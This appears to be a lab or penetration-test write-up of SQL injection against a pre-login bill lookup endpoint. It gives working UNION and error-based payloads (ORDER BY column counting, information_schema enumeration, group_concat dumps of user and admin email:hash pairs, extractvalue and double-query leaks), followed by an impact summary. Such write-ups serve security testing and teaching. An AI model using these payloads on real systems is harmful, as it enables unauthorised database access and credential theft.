# Task 8: Verbose SQLi Extraction

**Vulnerability:** SQL Injection, UNION and error-based (CWE-89)
**Endpoint:** `GET /lookup?connection=`
**Context:** single-quoted string, 7 columns, all displayed

The Bill Lookup page prints the `connection` value straight back and concatenates
it into a single-quoted SQL string against the `bills` table. That gives both a
verbose error channel and a UNION injection point. Because the lookup runs before
login, this extracts the full `users` and `admins` tables, hashes included, with
no authentication.

---

## Steps

Work these in Burp Repeater so the payloads go out raw and the normal response can
be compared against each probe. The value lands inside a single-quoted string, so
every payload closes the quote with `'` and comments off the trailing quote with
`-- -`.

Confirm the injection with a bare quote. The app answers with a verbose Database
error box that echoes the query it was building, which confirms string context and
that errors are not suppressed.

```
'
```

Count the columns with ORDER BY. Walk the index up until the query breaks. `ORDER
BY 7` still sorts, `ORDER BY 8` throws "Unknown column '8' in 'order clause'", so
the query returns exactly 7 columns. If the first error had not already given away
the column count, this is how you recover it.

```
' ORDER BY 1-- -
' ORDER BY 7-- -
' ORDER BY 8-- -
```

Map which columns are displayed with a UNION marker row. Every slot 1 through 7
surfaces in the rendered table, so all seven are usable output channels and real
expressions can go in any of them.

```
' UNION SELECT 1,2,3,4,5,6,7-- -
```

Fingerprint the backend by dropping `@@version` and `database()` into two of the
displayed columns.

```
' UNION SELECT 1,@@version,database(),4,5,6,7-- -
```

Enumerate the schema from `information_schema`, which proves the tables were
discovered rather than known from the leaked install notes.

```
' UNION SELECT 1,group_concat(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -
```

Dump the users table. One row per request with LIMIT reads cleanly as evidence:

```
' UNION SELECT 1,email,password,4,5,6,7 FROM users LIMIT 0,1-- -
```

Or pull every user in a single response, which is the easiest form to paste into
the hash file for Task 11:

```
' UNION SELECT 1,group_concat(email,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users-- -
```

Dump the admins table the same way. These staff hashes are the ones worth real
effort in Task 11.

```
' UNION SELECT 1,group_concat(email,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM admins-- -
```

Error-based variant, the fallback for when no column is reflected on the page. The
first thing to try is the XPath leak through `extractvalue`, with `0x7e` marking
where the data starts:

```
4100237811' AND extractvalue(1,concat(0x7e,(SELECT concat(email,0x3a,password) FROM users LIMIT 1)))-- -
```

This build refuses it, answering "Only constant XPATH queries are supported." The
XPath functions are locked down here, so that channel is dead on this target. The
reliable fallback on MariaDB is the double-query technique, which leaks through a
duplicate-key error from a `count(*)` and `floor(rand(0)*2)` group-by collision
instead of through XPath:

```
4100237811' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT concat(email,0x3a,password) FROM users LIMIT 1),0x7e,floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -
```

That one lands, throwing a "Duplicate entry" error with the first user's
`email:hash` embedded in the key, split from the random value by the `~` marker.
Unlike `extractvalue`, which clips its output at 32 characters and would have cut
off an MD5 hash, the duplicate-key message carries the full string, so the complete
hash comes through. Both error-based forms leak one row per request, so UNION is
still the better tool for bulk dumping and this is the targeted fallback.

## Evidence

The bare single quote triggering the verbose SQL error, confirming the injection
and the single-quoted string context:

<img width="942" height="455" alt="verbose SQL error on a bare single quote" src="https://github.com/user-attachments/assets/48d807f1-d6c5-415a-84ec-e4b18dbb2e13" />

`ORDER BY 7` still sorting, so the query returns at least 7 columns:

<img width="955" height="339" alt="ORDER BY 7 succeeds" src="https://github.com/user-attachments/assets/ad2563a6-86aa-41a7-9b5e-8f29bf57f372" />

`ORDER BY 8` breaking with an unknown-column error, fixing the count at exactly 7:

<img width="942" height="455" alt="ORDER BY 8 fails, column count is 7" src="https://github.com/user-attachments/assets/aa81ddf5-27d0-48b7-a1cf-195285b86046" />

The `UNION SELECT 1,2,3,4,5,6,7` marker row, with all seven columns displayed in
the table:

<img width="939" height="366" alt="UNION column map, all 7 columns displayed" src="https://github.com/user-attachments/assets/70387ce7-5acf-4a22-874a-3c6f121e8188" />

Backend version and current schema extracted through the displayed columns:

<img width="954" height="393" alt="MariaDB version and database name via UNION" src="https://github.com/user-attachments/assets/75b79901-289d-4687-a2c1-a156fca88470" />

A single user row pulled with the per-row LIMIT form, email and hash in their own
cells:

<img width="949" height="392" alt="single user email and password hash via UNION" src="https://github.com/user-attachments/assets/2d037646-87a8-4b77-a81e-c60241683d31" />

Every user dumped into one cell with `group_concat`, the form used as the Task 11
cracking input:

<img width="927" height="724" alt="all user email:hash pairs via group_concat" src="https://github.com/user-attachments/assets/356475ac-a4e8-4363-bad0-790120799b1c" />

The admins table dumped the same way, the staff `email:hash` pairs:

<img width="957" height="414" alt="all admin email:hash pairs via group_concat" src="https://github.com/user-attachments/assets/08144309-24e6-4a91-babc-f4cf18a06838" />

The error-based variant, first attempt: `extractvalue` refused by this build with
"Only constant XPATH queries are supported," so the XPath channel is unavailable:

<img width="921" height="471" alt="image" src="https://github.com/user-attachments/assets/152188c2-b9f5-4160-b420-18c986b47711" />

The double-query fallback succeeding, leaking the first user's `email:hash` through
a duplicate-key error with the `~` marker separating the value from the random
collision output:

<img width="914" height="548" alt="image" src="https://github.com/user-attachments/assets/a77d325a-c828-4173-b3c0-dc4348722fbf" />

## What this reveals to an attacker

A pre-auth lookup field exposes the entire credential store. An attacker reads
every customer and staff `email:hash` pair without logging in, then cracks the
unsalted MD5 hashes offline (see Task 11) to obtain working passwords. The verbose
error page compounds this by handing over the query structure, column count, and
quoting context for free, which is most of the work of building a reliable UNION
payload. Because the same endpoint also enumerates `information_schema`, the
attacker maps the whole database rather than guessing table names. Even where the
backend restricts the usual XPath error functions, a second error-based technique
still leaks data, so suppressing one injection channel is not a fix.

## Remediation

See [remediation](../remediation.md)
